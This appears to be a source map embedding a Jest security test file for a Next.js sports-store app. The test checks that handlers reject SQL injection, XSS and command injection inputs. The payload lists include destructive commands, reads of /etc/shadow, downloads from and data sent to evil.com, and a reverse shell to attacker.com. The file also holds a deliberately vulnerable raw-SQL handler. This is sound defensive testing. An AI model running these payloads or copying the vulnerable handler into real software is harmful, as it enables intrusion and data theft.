{"version":3,"sources":["/Users/sachin/Documents/md-sports-/tests/security/security.test.ts"],"sourcesContent":["import { describe, it, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';\nimport { NextRequest, NextResponse } from 'next/server';\nimport jwt from 'jsonwebtoken';\nimport bcrypt from 'bcryptjs';\nimport crypto from 'crypto';\n\n// Security test utilities\nclass SecurityTestUtils {\n  static generateSQLInjectionPayloads(): string[] {\n    return [\n      \"'; DROP TABLE users; --\",\n      \"' OR '1'='1\",\n      \"' UNION SELECT * FROM users --\",\n      \"'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --\",\n      \"' OR 1=1 --\",\n      \"admin'--\",\n      \"admin'/*\",\n      \"' OR 'x'='x\",\n      \"') OR ('1'='1\",\n      \"' OR 1=1#\",\n    ];\n  }\n\n  static generateXSSPayloads(): string[] {\n    return [\n      \"<script>alert('XSS')</script>\",\n      \"javascript:alert('XSS')\",\n      \"<img src=x onerror=alert('XSS')>\",\n      \"<svg onload=alert('XSS')>\",\n      \"<iframe src=javascript:alert('XSS')></iframe>\",\n      \"<body onload=alert('XSS')>\",\n      \"<input onfocus=alert('XSS') autofocus>\",\n      \"<select onfocus=alert('XSS') autofocus>\",\n      \"<textarea onfocus=alert('XSS') autofocus>\",\n      \"<keygen onfocus=alert('XSS') autofocus>\",\n    ];\n  }\n\n  static generateCommandInjectionPayloads(): string[] {\n    return [\n      \"; ls -la\",\n      \"| cat /etc/passwd\",\n      \"&& rm -rf /\",\n      \"; cat /etc/shadow\",\n      \"| nc -l 4444\",\n      \"; wget http://evil.com/malware\",\n      \"&& curl http://evil.com/steal-data\",\n      \"; python -c 'import os; os.system(\\\"rm -rf /\\\")'\",\n      \"| bash -i >& /dev/tcp/attacker.com/8080 0>&1\",\n      \"; /bin/bash\",\n    ];\n  }\n\n  static generateLongStrings(): string[] {\n    return [\n      'A'.repeat(1000),\n      'A'.repeat(10000),\n      'A'.repeat(100000),\n      '\\x00'.repeat(1000), // Null bytes\n      '\\n'.repeat(1000), // Newlines\n      '\\r'.repeat(1000), // Carriage returns\n    ];\n  }\n\n  static generateInvalidTokens(): string[] {\n    return [\n      'invalid.token.here',\n      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',\n      '', // Empty token\n      'Bearer', // Just Bearer\n      'null',\n      'undefined',\n      '{}',\n      'admin',\n      '../../etc/passwd',\n      '<script>alert(\"xss\")</script>',\n    ];\n  }\n\n  static async hashPassword(password: string): Promise<string> {\n    return bcrypt.hash(password, 10);\n  }\n\n  static generateValidJWT(payload: any, secret: string = 'test-secret'): string {\n    return jwt.sign(payload, secret, { expiresIn: '1h' });\n  }\n\n  static generateExpiredJWT(payload: any, secret: string = 'test-secret'): string {\n    return jwt.sign(payload, secret, { expiresIn: '-1h' });\n  }\n}\n\n// Mock API handlers for security testing\nconst mockPrisma = {\n  user: {\n    findUnique: jest.fn(),\n    findMany: jest.fn(),\n    create: jest.fn(),\n    update: jest.fn(),\n  },\n  product: {\n    findMany: jest.fn(),\n    create: jest.fn(),\n  },\n  $queryRaw: jest.fn(),\n  $executeRaw: jest.fn(),\n};\n\n// Mock vulnerable endpoint for testing\nconst vulnerableSearchHandler = async (req: NextRequest) => {\n  const url = new URL(req.url);\n  const query = url.searchParams.get('q');\n  \n  if (!query) {\n    return NextResponse.json({ error: 'Query required' }, { status: 400 });\n  }\n\n  // Simulate SQL injection vulnerability (for testing purposes)\n  try {\n    // This would be vulnerable in real code - DON'T DO THIS\n    const results = await mockPrisma.$queryRaw`\n      SELECT * FROM products WHERE name LIKE '%${query}%'\n    `;\n    \n    return NextResponse.json({ results });\n  } catch (error) {\n    return NextResponse.json({ error: 'Database error' }, { status: 500 });\n  }\n};\n\n// Secure search handler for comparison\nconst secureSearchHandler = async (req: NextRequest) => {\n  const url = new URL(req.url);\n  const query = url.searchParams.get('q');\n  \n  if (!query) {\n    return NextResponse.json({ error: 'Query required' }, { status: 400 });\n  }\n\n  // Input validation\n  if (query.length > 100) {\n    return NextResponse.json({ error: 'Query too long' }, { status: 400 });\n  }\n\n  // Sanitize input\n  const sanitizedQuery = query.replace(/[<>\"'&]/g, '');\n  \n  try {\n    // Use parameterized queries\n    const results = await mockPrisma.product.findMany({\n      where: {\n        name: {\n          contains: sanitizedQuery,\n          mode: 'insensitive',\n        },\n      },\n    });\n    \n    return NextResponse.json({ results });\n  } catch (error) {\n    return NextResponse.json({ error: 'Database error' }, { status: 500 });\n  }\n};\n\n// Authentication handler with security measures\nconst secureAuthHandler = async (req: NextRequest) => {\n  const body = await req.json();\n  const { email, password } = body;\n\n  // Rate limiting simulation\n  const clientIP = req.headers.get('x-forwarded-for') || 'unknown';\n  \n  // Input validation\n  if (!email || !password) {\n    return NextResponse.json(\n      { error: 'Email and password are required' },\n      { status: 400 }\n    );\n  }\n\n  if (email.length > 254 || password.length > 128) {\n    return NextResponse.json(\n      { error: 'Input too long' },\n      { status: 400 }\n    );\n  }\n\n  // Email format validation\n  const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n  if (!emailRegex.test(email)) {\n    return NextResponse.json(\n      { error: 'Invalid email format' },\n      { status: 400 }\n    );\n  }\n\n  // Check for suspicious patterns\n  const suspiciousPatterns = [\n    /<script/i,\n    /javascript:/i,\n    /on\\w+=/i,\n    /\\bor\\b.*\\b1\\s*=\\s*1\\b/i,\n    /union.*select/i,\n    /drop.*table/i,\n  ];\n\n  const isSuspicious = suspiciousPatterns.some(pattern => \n    pattern.test(email) || pattern.test(password)\n  );\n\n  if (isSuspicious) {\n    return NextResponse.json(\n      { error: 'Invalid input detected' },\n      { status: 400 }\n    );\n  }\n\n  try {\n    const user = await mockPrisma.user.findUnique({\n      where: { email },\n    });\n\n    if (!user) {\n      // Constant time delay to prevent timing attacks\n      await new Promise(resolve => setTimeout(resolve, 100));\n      return NextResponse.json(\n        { error: 'Invalid credentials' },\n        { status: 401 }\n      );\n    }\n\n    const isValid = await bcrypt.compare(password, user.password);\n    if (!isValid) {\n      return NextResponse.json(\n        { error: 'Invalid credentials' },\n        { status: 401 }\n      );\n    }\n\n    // Generate secure token\n    const token = jwt.sign(\n      { \n        userId: user.id, \n        email: user.email,\n        iat: Math.floor(Date.now() / 1000),\n      },\n      process.env.JWT_SECRET || 'test-secret',\n      { \n        expiresIn: '15m',\n        issuer: 'md-sports',\n        audience: 'md-sports-client',\n      }\n    );\n\n    return NextResponse.json({\n      user: {\n        id: user.id,\n        email: user.email,\n        name: user.name,\n      },\n      token,\n    });\n  } catch (error) {\n    return NextResponse.json(\n      { error: 'Internal server error' },\n      { status: 500 }\n    );\n  }\n};\n\ndescribe('Security Tests', () => {\n  beforeAll(() => {\n    process.env.JWT_SECRET = 'test-secret-key-for-security-testing';\n  });\n\n  beforeEach(() => {\n    jest.clearAllMocks();\n  });\n\n  describe('SQL Injection Protection', () => {\n    it('should prevent SQL injection in search queries', async () => {\n      const sqlPayloads = SecurityTestUtils.generateSQLInjectionPayloads();\n      \n      for (const payload of sqlPayloads) {\n        const request = new NextRequest(\n          `http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`\n        );\n\n        // Test with secure handler\n        const response = await secureSearchHandler(request);\n        \n        // Should not return 500 error or expose database structure\n        expect(response.status).not.toBe(500);\n        \n        const data = await response.json();\n        expect(data).not.toHaveProperty('results');\n      }\n    });\n\n    it('should use parameterized queries', async () => {\n      mockPrisma.product.findMany.mockResolvedValue([]);\n      \n      const request = new NextRequest(\n        \"http://localhost:3000/api/search?q=test' OR '1'='1\"\n      );\n\n      await secureSearchHandler(request);\n      \n      // Verify parameterized query was used\n      expect(mockPrisma.product.findMany).toHaveBeenCalledWith({\n        where: {\n          name: {\n            contains: \"test OR 11\", // Sanitized\n            mode: 'insensitive',\n          },\n        },\n      });\n    });\n  });\n\n  describe('XSS Protection', () => {\n    it('should sanitize XSS payloads in input', async () => {\n      const xssPayloads = SecurityTestUtils.generateXSSPayloads();\n      \n      for (const payload of xssPayloads) {\n        const request = new NextRequest(\n          `http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`\n        );\n\n        const response = await secureSearchHandler(request);\n        const data = await response.json();\n        \n        // Should not contain script tags or javascript\n        if (data.results) {\n          const responseStr = JSON.stringify(data);\n          expect(responseStr).not.toMatch(/<script/i);\n          expect(responseStr).not.toMatch(/javascript:/i);\n          expect(responseStr).not.toMatch(/on\\w+=/i);\n        }\n      }\n    });\n\n    it('should reject suspicious input patterns', async () => {\n      const request = new NextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: JSON.stringify({\n          email: '<script>alert(\"xss\")</script>@test.com',\n          password: 'password123',\n        }),\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(400);\n      expect(data.error).toBe('Invalid input detected');\n    });\n  });\n\n  describe('Authentication Security', () => {\n    it('should reject invalid JWT tokens', async () => {\n      const invalidTokens = SecurityTestUtils.generateInvalidTokens();\n      \n      for (const token of invalidTokens) {\n        expect(() => {\n          jwt.verify(token, process.env.JWT_SECRET!);\n        }).toThrow();\n      }\n    });\n\n    it('should reject expired tokens', async () => {\n      const expiredToken = SecurityTestUtils.generateExpiredJWT({\n        userId: 1,\n        email: 'test@example.com',\n      });\n      \n      expect(() => {\n        jwt.verify(expiredToken, process.env.JWT_SECRET!);\n      }).toThrow('jwt expired');\n    });\n\n    it('should use secure password hashing', async () => {\n      const password = 'testpassword123';\n      const hash = await SecurityTestUtils.hashPassword(password);\n      \n      // Should be bcrypt hash\n      expect(hash).toMatch(/^\\$2[aby]\\$\\d+\\$/);\n      \n      // Should not be the original password\n      expect(hash).not.toBe(password);\n      \n      // Should verify correctly\n      const isValid = await bcrypt.compare(password, hash);\n      expect(isValid).toBe(true);\n      \n      // Should not verify with wrong password\n      const isInvalid = await bcrypt.compare('wrongpassword', hash);\n      expect(isInvalid).toBe(false);\n    });\n\n    it('should prevent timing attacks in authentication', async () => {\n      const validEmail = 'test@example.com';\n      const invalidEmail = 'nonexistent@example.com';\n      \n      // Mock user lookup\n      mockPrisma.user.findUnique.mockImplementation(({ where }) => {\n        if (where.email === validEmail) {\n          return Promise.resolve({\n            id: 1,\n            email: validEmail,\n            password: '$2a$10$hashedPassword',\n            name: 'Test User',\n          });\n        }\n        return Promise.resolve(null);\n      });\n\n      const validRequest = new NextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: JSON.stringify({\n          email: validEmail,\n          password: 'wrongpassword',\n        }),\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const invalidRequest = new NextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: JSON.stringify({\n          email: invalidEmail,\n          password: 'wrongpassword',\n        }),\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      // Measure response times\n      const start1 = Date.now();\n      const response1 = await secureAuthHandler(validRequest);\n      const time1 = Date.now() - start1;\n\n      const start2 = Date.now();\n      const response2 = await secureAuthHandler(invalidRequest);\n      const time2 = Date.now() - start2;\n\n      // Both should return 401\n      expect(response1.status).toBe(401);\n      expect(response2.status).toBe(401);\n      \n      // Response times should be similar (within 50ms)\n      expect(Math.abs(time1 - time2)).toBeLessThan(50);\n    });\n  });\n\n  describe('Input Validation', () => {\n    it('should reject oversized inputs', async () => {\n      const longStrings = SecurityTestUtils.generateLongStrings();\n      \n      for (const longString of longStrings) {\n        const request = new NextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: JSON.stringify({\n            email: longString,\n            password: 'password123',\n          }),\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        \n        expect(response.status).toBe(400);\n      }\n    });\n\n    it('should validate email format', async () => {\n      const invalidEmails = [\n        'invalid-email',\n        '@domain.com',\n        'user@',\n        'user..name@domain.com',\n        'user@domain',\n        '',\n        'user name@domain.com',\n      ];\n      \n      for (const email of invalidEmails) {\n        const request = new NextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: JSON.stringify({\n            email,\n            password: 'password123',\n          }),\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        const data = await response.json();\n        \n        expect(response.status).toBe(400);\n        expect(data.error).toBe('Invalid email format');\n      }\n    });\n\n    it('should handle null bytes and special characters', async () => {\n      const maliciousInputs = [\n        'test\\x00@example.com',\n        'test\\r\\n@example.com',\n        'test\\t@example.com',\n        'test\\b@example.com',\n      ];\n      \n      for (const input of maliciousInputs) {\n        const request = new NextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: JSON.stringify({\n            email: input,\n            password: 'password123',\n          }),\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        \n        expect(response.status).toBe(400);\n      }\n    });\n  });\n\n  describe('Command Injection Protection', () => {\n    it('should prevent command injection in file operations', () => {\n      const commandPayloads = SecurityTestUtils.generateCommandInjectionPayloads();\n      \n      for (const payload of commandPayloads) {\n        // Simulate file name validation\n        const isValidFileName = (filename: string): boolean => {\n          // Only allow alphanumeric, dots, hyphens, and underscores\n          return /^[a-zA-Z0-9._-]+$/.test(filename);\n        };\n        \n        expect(isValidFileName(payload)).toBe(false);\n      }\n    });\n  });\n\n  describe('JWT Security', () => {\n    it('should use secure JWT configuration', () => {\n      const payload = { userId: 1, email: 'test@example.com' };\n      const token = SecurityTestUtils.generateValidJWT(payload);\n      \n      const decoded = jwt.verify(token, process.env.JWT_SECRET!) as any;\n      \n      expect(decoded.userId).toBe(1);\n      expect(decoded.email).toBe('test@example.com');\n      expect(decoded.iat).toBeDefined();\n      expect(decoded.exp).toBeDefined();\n    });\n\n    it('should not accept tokens with none algorithm', () => {\n      // Create a token with 'none' algorithm (security vulnerability)\n      const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');\n      const payload = Buffer.from(JSON.stringify({ userId: 1, email: 'test@example.com' })).toString('base64url');\n      const noneToken = `${header}.${payload}.`;\n      \n      expect(() => {\n        jwt.verify(noneToken, process.env.JWT_SECRET!);\n      }).toThrow();\n    });\n\n    it('should validate token signature', () => {\n      const validToken = SecurityTestUtils.generateValidJWT({ userId: 1 });\n      const [header, payload] = validToken.split('.');\n      const tamperedToken = `${header}.${payload}.tampered_signature`;\n      \n      expect(() => {\n        jwt.verify(tamperedToken, process.env.JWT_SECRET!);\n      }).toThrow('invalid signature');\n    });\n  });\n\n  describe('Rate Limiting Simulation', () => {\n    it('should handle rapid successive requests', async () => {\n      const requests = Array.from({ length: 100 }, () => \n        new NextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: JSON.stringify({\n            email: 'test@example.com',\n            password: 'password123',\n          }),\n          headers: {\n            'Content-Type': 'application/json',\n            'X-Forwarded-For': '192.168.1.100',\n          },\n        })\n      );\n\n      // In a real implementation, this would trigger rate limiting\n      const responses = await Promise.all(\n        requests.map(req => secureAuthHandler(req))\n      );\n\n      // All requests should be processed (in real app, some would be rate limited)\n      responses.forEach(response => {\n        expect([400, 401, 429]).toContain(response.status); // 429 = Too Many Requests\n      });\n    });\n  });\n\n  describe('Error Handling Security', () => {\n    it('should not expose sensitive information in error messages', async () => {\n      // Simulate database error\n      mockPrisma.user.findUnique.mockRejectedValue(new Error('Connection failed to database \"md_sports\" on host \"localhost\"'));\n      \n      const request = new NextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: JSON.stringify({\n          email: 'test@example.com',\n          password: 'password123',\n        }),\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(500);\n      expect(data.error).toBe('Internal server error');\n      expect(data.error).not.toContain('database');\n      expect(data.error).not.toContain('localhost');\n      expect(data.error).not.toContain('md_sports');\n    });\n\n    it('should use generic error messages for authentication failures', async () => {\n      mockPrisma.user.findUnique.mockResolvedValue(null);\n      \n      const request = new NextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: JSON.stringify({\n          email: 'nonexistent@example.com',\n          password: 'password123',\n        }),\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(401);\n      expect(data.error).toBe('Invalid credentials');\n      expect(data.error).not.toContain('user not found');\n      expect(data.error).not.toContain('email');\n    });\n  });\n});"],"names":["SecurityTestUtils","generateSQLInjectionPayloads","generateXSSPayloads","generateCommandInjectionPayloads","generateLongStrings","repeat","generateInvalidTokens","hashPassword","password","bcrypt","hash","generateValidJWT","payload","secret","jwt","sign","expiresIn","generateExpiredJWT","mockPrisma","user","findUnique","jest","fn","findMany","create","update","product","$queryRaw","$executeRaw","vulnerableSearchHandler","req","url","URL","query","searchParams","get","NextResponse","json","error","status","results","secureSearchHandler","length","sanitizedQuery","replace","where","name","contains","mode","secureAuthHandler","body","email","clientIP","headers","emailRegex","test","suspiciousPatterns","isSuspicious","some","pattern","Promise","resolve","setTimeout","isValid","compare","token","userId","id","iat","Math","floor","Date","now","process","env","JWT_SECRET","issuer","audience","describe","beforeAll","beforeEach","clearAllMocks","it","sqlPayloads","request","NextRequest","encodeURIComponent","response","expect","not","toBe","data","toHaveProperty","mockResolvedValue","toHaveBeenCalledWith","xssPayloads","responseStr","JSON","stringify","toMatch","method","invalidTokens","verify","toThrow","expiredToken","isInvalid","validEmail","invalidEmail","mockImplementation","validRequest","invalidRequest","start1","response1","time1","start2","response2","time2","abs","toBeLessThan","longStrings","longString","invalidEmails","maliciousInputs","input","commandPayloads","isValidFileName","filename","decoded","toBeDefined","exp","header","Buffer","from","alg","typ","toString","noneToken","validToken","split","tamperedToken","requests","Array","responses","all","map","forEach","toContain","mockRejectedValue","Error"],"mappings":"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